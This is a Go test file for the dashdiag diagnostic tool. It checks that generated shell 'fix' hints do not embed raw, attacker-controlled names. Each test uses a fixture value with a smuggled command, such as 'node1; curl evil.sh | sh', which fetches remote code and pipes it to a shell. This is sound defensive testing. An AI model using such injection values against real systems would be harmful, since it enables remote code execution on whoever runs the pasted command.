package analysis

import (
	"strings"
	"testing"

	"github.com/keyorixhq/dashdiag/internal/models"
)

// This file covers batch 3 of the shell-hint validation audit backlog
// (dashdiag-private/planning/TRIAGE-shell-hint-validation.md) — the
// remaining entries: checkBonding, checkK8sNodes, checkSteamOSDisk,
// checkRAID, checkMultipath, checkServices, and a sibling gap found while
// auditing checkServices' file (checkSystemd's SlowUnits loop, same
// unit-name provenance as failedUnitInsight). Same threat model as batches
// 1-2: each value is spliced unescaped into a copy-pasteable "to fix:"/"to
// inspect:" shell hint, so a crafted value containing shell metacharacters
// must never appear verbatim in one.
//
// ruleIOWaitCulprit/ruleIOSingleDeviceDegradation (correlate.go) and
// checkDiskExtras' SMART loop are intentionally NOT covered here — both were
// re-verified against actual collector provenance and found not to be
// attacker-influenceable (see the triage file's batch 3 write-up).

func TestCheckBonding_NamesOmitShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeBond := "bond0; curl evil.sh | sh"
	unsafeSlave := "eth0; curl evil.sh | sh"
	got := checkBonding(models.BondingInfo{
		Bonds: []models.BondInterface{{
			Name:       unsafeBond,
			Slaves:     []models.BondSlave{{Name: unsafeSlave, State: "down"}},
			DownSlaves: 1,
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a fully-down single-slave bond")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("bonding hint must not embed the raw shell-metacharacter bond/slave name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckK8sNodes_NodeNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "node1; curl evil.sh | sh"
	got := checkK8sNodes(models.K8sInfo{
		Nodes: []models.K8sNodeInfo{{
			Name:       unsafe,
			Conditions: map[string]string{"MemoryPressure": "True"},
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a node with MemoryPressure=True")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("k8s node hint must not embed the raw shell-metacharacter node name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckSteamOSDisk_BindMountOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafePath := "/opt; curl evil.sh | sh"
	unsafeTarget := "/home/.steamos/offload/opt; curl evil.sh | sh"
	got := checkSteamOSDisk(&models.SteamOSDisk{
		BindMounts: []models.SteamOSBindMount{{Path: unsafePath, Target: unsafeTarget, OK: false}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a broken bind mount")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("SteamOS bind mount hint must not embed the raw shell-metacharacter path/target verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckRAID_ArrayNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "md0; curl evil.sh | sh"
	got := checkRAID(models.RAIDInfo{
		Arrays: []models.RAIDDevice{{Name: unsafe, Level: "raid1", State: "failed"}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a failed RAID array")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("RAID hint must not embed the raw shell-metacharacter array name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckMultipath_DMOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "mpatha; curl evil.sh | sh"
	got := checkMultipath(models.MultipathInfo{
		Available: true,
		Devices: []models.MultipathDevice{{
			Name: "mpatha", DM: unsafe, ActivePaths: 1, FailedPaths: 1, TotalPaths: 2,
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a degraded multipath device")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("multipath hint must not embed the raw shell-metacharacter DM name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckServices_HostAndProtocolOmitShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeHost := "example.com; curl evil.sh | sh"
	unsafeProtocol := "http; curl evil.sh | sh"
	got := checkServices(models.ServicesInfo{
		Results: []models.ServiceResult{{
			Name: "web", Host: unsafeHost, Port: 443, Protocol: unsafeProtocol,
			Status: "CRIT", StatusCode: 500,
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a CRIT service result")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("services hint must not embed the raw shell-metacharacter host/protocol verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckServices_UnreachableHostOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeHost := "example.com; curl evil.sh | sh"
	got := checkServices(models.ServicesInfo{
		Results: []models.ServiceResult{{
			Name: "web", Host: unsafeHost, Port: 443, Protocol: "https",
			Status: "WARN", Reachable: false,
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for an unreachable service")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("services hint must not embed the raw shell-metacharacter host verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

// TestCheckSystemd_SlowUnitNameOmitsShellMetachars covers a sibling gap found
// while auditing checkServices' file, not on the original candidate list:
// SlowUnits (systemd-analyze blame) is the same unit-name provenance class as
// FailedUnits (failedUnitInsight, batch 1) but was left unguarded.
func TestCheckSystemd_SlowUnitNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "myslow.service; curl evil.sh | sh"
	got := checkSystemd(models.SystemdInfo{
		Available: true,
		SlowUnits: []models.SlowUnit{{Name: unsafe, Duration: 15}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a slow boot unit")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("slow-boot-unit hint must not embed the raw shell-metacharacter unit name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}
